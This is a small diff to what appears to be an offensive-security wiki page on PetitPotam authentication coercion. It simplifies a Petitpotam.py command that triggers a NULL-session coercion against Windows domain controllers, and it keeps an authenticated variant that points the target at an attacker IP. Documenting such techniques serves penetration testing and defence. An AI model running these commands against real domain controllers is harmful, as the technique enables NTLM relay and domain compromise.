@@ -28,7 +28,7 @@ Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 Some tests conducted in lab environments showed that, unlike the [MS-RPRN abuse \(printbug\)](ms-rprn.md), a NULL session could potentially be used to trigger that bug \(if allowed by the target\). This has only been verified to be working on on Windows Server 2016 and Windows Server 2019 Domain Controllers.
 
 ```bash
-Petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
+Petitpotam.py $ATTACKER_IP $TARGET_IP
 ```
 {% endhint %}
 
